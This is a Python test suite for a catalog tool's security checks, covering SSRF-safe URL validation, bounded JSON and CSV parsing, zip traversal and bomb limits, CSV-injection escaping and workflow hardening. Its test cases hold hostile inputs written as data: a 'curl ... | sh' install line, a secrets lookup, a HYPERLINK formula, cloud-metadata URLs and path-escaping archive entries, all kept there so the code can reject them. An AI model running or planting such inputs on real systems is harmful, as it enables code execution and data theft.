from __future__ import annotations

import importlib.util
import json
import stat
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

MODULE_PATH = Path(__file__).resolve().parents[1] / "catalog_security.py"
sys.path.insert(0, str(MODULE_PATH.parent))
SPEC = importlib.util.spec_from_file_location("catalog_security", MODULE_PATH)
assert SPEC and SPEC.loader
catalog_security = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = catalog_security
SPEC.loader.exec_module(catalog_security)

POLICY_PATH = Path(__file__).resolve().parents[1] / "catalog_workflow_policy.py"
POLICY_SPEC = importlib.util.spec_from_file_location("catalog_workflow_policy", POLICY_PATH)
assert POLICY_SPEC and POLICY_SPEC.loader
catalog_workflow_policy = importlib.util.module_from_spec(POLICY_SPEC)
sys.modules[POLICY_SPEC.name] = catalog_workflow_policy
POLICY_SPEC.loader.exec_module(catalog_workflow_policy)

ROOT = Path(__file__).resolve().parents[2]


class NetworkSecurityTests(unittest.TestCase):
    def test_admitted_https_source_url_is_accepted(self) -> None:
        value = "https://static.example.org/export/products.json"
        self.assertEqual(
            catalog_security.validate_https_url(
                value,
                allowed_hosts={"static.example.org"},
                allowed_path_prefixes=("/export",),
            ),
            value,
        )

    def test_ssrf_and_untrusted_urls_fail_closed(self) -> None:
        cases = (
            "http://static.example.org/export/products.json",
            "https://user:secret@static.example.org/export/products.json",
            "https://localhost/export/products.json",
            "https://127.0.0.1/export/products.json",
            "https://169.254.169.254/latest/meta-data",
            "https://10.0.0.2/export/products.json",
            "https://evil.example.org/export/products.json",
            "https://static.example.org/private/products.json",
            "https://static.example.org/export/products.json#fragment",
            "https://static.example.org:8443/export/products.json",
            "https://static.example.org:notaport/export/products.json",
            "https://static.example.org/export/../private/products.json",
            "https://static.example.org/export/%2e%2e/private/products.json",
            "https://static.example.org/export/%252e%252e/private/products.json",
            "https://static.example.org/export/%3fadmin=true",
        )
        for value in cases:
            with self.subTest(value=value):
                with self.assertRaises(catalog_security.SecurityError):
                    catalog_security.validate_https_url(
                        value,
                        allowed_hosts={"static.example.org"},
                        allowed_path_prefixes=("/export",),
                    )

    def test_dns_redirect_and_response_limits_fail_closed(self) -> None:
        with self.assertRaises(catalog_security.SecurityError):
            catalog_security.validate_resolved_addresses(["169.254.169.254"])
        catalog_security.validate_resolved_addresses(["93.184.216.34"])

        with self.assertRaises(catalog_security.SecurityError):
            catalog_security.validate_redirect_chain(
                [
                    "https://static.example.org/export/a",
                    "https://static.example.org/export/b",
                    "https://static.example.org/export/c",
                ],
                allowed_hosts={"static.example.org"},
                allowed_path_prefixes=("/export",),
                max_redirects=1,
            )

        import io
        with self.assertRaisesRegex(catalog_security.SecurityError, "byte limit"):
            catalog_security.read_bounded_stream(io.BytesIO(b"x" * 65), max_bytes=64, chunk_size=8)


class ParserSecurityTests(unittest.TestCase):
    def test_bounded_json_accepts_small_strict_payload(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "payload.json"
            path.write_text('{"products":[{"name":"safe"}]}', encoding="utf-8")
            parsed = catalog_security.load_bounded_json(path, max_bytes=1024)
            self.assertEqual(parsed["products"][0]["name"], "safe")

    def test_bounded_json_rejects_size_depth_and_controls(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)

            oversized = root / "oversized.json"
            oversized.write_text(json.dumps({"value": "x" * 100}), encoding="utf-8")
            with self.assertRaisesRegex(catalog_security.SecurityError, "byte limit"):
                catalog_security.load_bounded_json(oversized, max_bytes=16)

            deep = root / "deep.json"
            deep.write_text(json.dumps([[[[["value"]]]]]), encoding="utf-8")
            with self.assertRaisesRegex(catalog_security.SecurityError, "nesting"):
                catalog_security.load_bounded_json(deep, max_bytes=1024, max_depth=3)

            control = root / "control.json"
            control.write_text(json.dumps({"value": "safe\u0001unsafe"}), encoding="utf-8")
            with self.assertRaisesRegex(catalog_security.SecurityError, "control"):
                catalog_security.load_bounded_json(control, max_bytes=1024)

            invalid = root / "invalid.json"
            invalid.write_bytes(b'{"value":"\xff"}')
            with self.assertRaisesRegex(catalog_security.SecurityError, "UTF-8"):
                catalog_security.load_bounded_json(invalid, max_bytes=1024)

            for name, payload in (
                ("nan", '{"value": NaN}'),
                ("infinity", '{"value": Infinity}'),
                ("overflow", '{"value": 1e9999}'),
                ("duplicate", '{"value": 1, "value": 2}'),
            ):
                path = root / f"{name}.json"
                path.write_text(payload, encoding="utf-8")
                with self.subTest(name=name):
                    with self.assertRaises(catalog_security.SecurityError):
                        catalog_security.load_bounded_json(path, max_bytes=1024)

    def test_csv_limits_and_unadmitted_xml_media_type_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "input.csv"
            path.write_text("a,b\n1,2\n", encoding="utf-8")
            self.assertEqual(
                catalog_security.load_bounded_csv(path, max_bytes=1024, max_rows=2, max_columns=2),
                [["a", "b"], ["1", "2"]],
            )
            with self.assertRaises(catalog_security.SecurityError):
                catalog_security.load_bounded_csv(path, max_bytes=1024, max_rows=1)

            malformed = Path(temporary) / "malformed.csv"
            malformed.write_text('a,b\n"unterminated,2\n', encoding="utf-8")
            with self.assertRaisesRegex(catalog_security.SecurityError, "malformed"):
                catalog_security.load_bounded_csv(malformed, max_bytes=1024)
        with self.assertRaises(catalog_security.SecurityError):
            catalog_security.require_media_type("application/xml", allowed={"application/json"})


class ArchiveSecurityTests(unittest.TestCase):
    def _archive(self, path: Path, entries: list[tuple[zipfile.ZipInfo | str, bytes]]) -> None:
        with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as bundle:
            for name, data in entries:
                bundle.writestr(name, data)

    def test_regular_archive_extracts_within_root(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            archive = root / "safe.zip"
            self._archive(archive, [("snapshot/products.json", b"{}")])
            extracted = catalog_security.extract_bounded_zip(archive, root / "out")
            self.assertEqual(len(extracted), 1)
            self.assertEqual(extracted[0].read_bytes(), b"{}")

    def test_traversal_absolute_backslash_and_symlink_entries_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            cases: list[tuple[str, zipfile.ZipInfo | str]] = [
                ("traversal", "../outside.txt"),
                ("absolute", "/tmp/outside.txt"),
                ("backslash", r"safe\..\outside.txt"),
            ]
            symlink = zipfile.ZipInfo("link")
            symlink.create_system = 3
            symlink.external_attr = (stat.S_IFLNK | 0o777) << 16
            cases.append(("symlink", symlink))
            for label, member in cases:
                archive = root / f"{label}.zip"
                self._archive(archive, [(member, b"target")])
                with self.subTest(label=label):
                    with self.assertRaises(catalog_security.SecurityError):
                        catalog_security.extract_bounded_zip(archive, root / f"out-{label}")

    def test_archive_bombs_and_entry_counts_are_bounded(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bomb = root / "bomb.zip"
            self._archive(bomb, [("huge.txt", b"A" * 100_000)])
            with self.assertRaises(catalog_security.SecurityError):
                catalog_security.extract_bounded_zip(
                    bomb,
                    root / "bomb-out",
                    max_file_bytes=200_000,
                    max_expanded_bytes=200_000,
                    max_compression_ratio=5,
                )

            many = root / "many.zip"
            self._archive(many, [("a", b"1"), ("b", b"2")])
            with self.assertRaisesRegex(catalog_security.SecurityError, "too many"):
                catalog_security.extract_bounded_zip(many, root / "many-out", max_entries=1)


class OutputSecurityTests(unittest.TestCase):
    def test_terminal_and_csv_injection_are_neutralized(self) -> None:
        self.assertEqual(catalog_security.sanitize_log_text("ok\x1b[31mBAD\x1b[0m\nnext"), "okBAD next")
        self.assertEqual(catalog_security.protect_csv_cell("=HYPERLINK(\"https://evil\")"), "'=HYPERLINK(\"https://evil\")")
        self.assertEqual(catalog_security.protect_csv_cell("ordinary"), "ordinary")
        self.assertEqual(catalog_security.protect_csv_cell("\r=1+1"), "'\r=1+1")
        self.assertEqual(catalog_security.protect_csv_cell("\n@SUM(A1:A2)"), "'\n@SUM(A1:A2)")

    def test_secret_canary_fails_without_echoing_canary(self) -> None:
        canary = "VERY_SECRET_CANARY_123"
        with self.assertRaises(catalog_security.SecurityError) as error:
            catalog_security.assert_no_secret_canaries(f"report {canary}", [canary])
        self.assertNotIn(canary, str(error.exception))

    def test_product_image_bytes_remain_outside_catalog_contract(self) -> None:
        for payload in (
            b"\x89PNG\r\n\x1a\npayload",
            b"\xff\xd8\xffpayload",
            b'<?xml version="1.0"?><svg></svg>',
            b"BMnot-a-reviewed-image",
            b"random-binary",
            b"RIFFxxxxAVI ",
        ):
            with self.subTest(prefix=payload[:8]):
                with self.assertRaises(catalog_security.SecurityError):
                    catalog_security.reject_product_image_bytes(payload)
        catalog_security.reject_product_image_bytes(b"")

    def test_manifest_is_bound_to_exact_reviewed_source_policy(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            temp = Path(temporary)
            policy = temp / "policy.json"
            policy.write_text('{"schemaVersion":1,"contractVersion":"1.0.0"}\n', encoding="utf-8")
            manifest = temp / "manifest.json"
            manifest.write_text('{"catalogVersion":"1.0.0","sha256":"' + ("a" * 64) + '"}\n', encoding="utf-8")
            bound = catalog_security.bind_manifest_source_policy(manifest, policy)
            self.assertEqual(bound["sourcePolicy"]["schemaVersion"], 1)
            catalog_security.validate_manifest_source_policy(manifest, policy)

            policy.write_text('{"schemaVersion":1,"contractVersion":"1.0.1"}\n', encoding="utf-8")
            with self.assertRaisesRegex(catalog_security.SecurityError, "does not match"):
                catalog_security.validate_manifest_source_policy(manifest, policy)


class WorkflowHardeningTests(unittest.TestCase):
    def _write_workflow(self, text: str) -> Path:
        self.temporary = tempfile.TemporaryDirectory()
        root = Path(self.temporary.name)
        (root / "bad.yml").write_text(text, encoding="utf-8")
        return root

    def tearDown(self) -> None:
        temporary = getattr(self, "temporary", None)
        if temporary is not None:
            temporary.cleanup()

    def test_checkout_credentials_must_not_persist(self) -> None:
        root = self._write_workflow(
            "name: bad\non: workflow_dispatch\npermissions:\n  contents: read\njobs:\n  x:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6\n"
        )
        with self.assertRaisesRegex(Exception, "persisted checkout credentials"):
            catalog_workflow_policy.validate_workflows(root)

    def test_dynamic_secret_lookup_and_pipe_to_shell_are_rejected(self) -> None:
        for body in (
            "      - run: echo '${{ secrets[inputs.name] }}'\n",
            "      - run: curl https://example.invalid/install | sh\n",
        ):
            root = self._write_workflow(
                "name: bad\non: workflow_dispatch\npermissions:\n  contents: read\njobs:\n  x:\n"
                "    runs-on: ubuntu-latest\n    steps:\n" + body
            )
            with self.assertRaises(Exception):
                catalog_workflow_policy.validate_workflows(root)
            self.tearDown()
            del self.temporary

    def test_floating_xcodegen_install_is_rejected(self) -> None:
        root = self._write_workflow(
            "name: iOS\non: workflow_dispatch\npermissions:\n  contents: read\njobs:\n  x:\n"
            "    runs-on: macos-26\n    steps:\n      - run: brew install xcodegen\n"
        )
        with self.assertRaisesRegex(Exception, "reviewed source pin"):
            catalog_workflow_policy.validate_workflows(root)

    def test_write_all_and_unexpected_write_scopes_are_rejected(self) -> None:
        for permissions in (
            "permissions: write-all\n",
            "permissions:\n  contents: read\n  packages: write\n",
        ):
            root = self._write_workflow(
                "name: bad\non: workflow_dispatch\n" + permissions +
                "jobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo safe\n"
            )
            with self.assertRaises(Exception):
                catalog_workflow_policy.validate_workflows(root)
            self.tearDown()
            del self.temporary

    def test_spaced_uses_key_cannot_bypass_action_pin_validation(self) -> None:
        root = self._write_workflow(
            "name: bad\non: workflow_dispatch\npermissions:\n  contents: read\njobs:\n  x:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses : actions/checkout@v6\n"
            "        with:\n          persist-credentials: false\n"
        )
        with self.assertRaisesRegex(Exception, "unpinned action"):
            catalog_workflow_policy.validate_workflows(root)


class DependencySecurityTests(unittest.TestCase):
    def test_reviewed_tooling_manifest_matches_all_workflow_dependencies(self) -> None:
        first = catalog_security.tooling_sbom(
            ROOT,
            ROOT / "Data/security/tooling-dependencies-v1.json",
        )
        second = catalog_security.tooling_sbom(
            ROOT,
            ROOT / "Data/security/tooling-dependencies-v1.json",
        )
        self.assertEqual(first, second)
        self.assertEqual(first["pythonRuntimeDependencies"], [])
        self.assertEqual(first["xcodegen"]["commitSha"], "8445e778451c7e44237b90281bde622d764b0084")
        self.assertTrue(first["githubActions"])


if __name__ == "__main__":
    unittest.main()
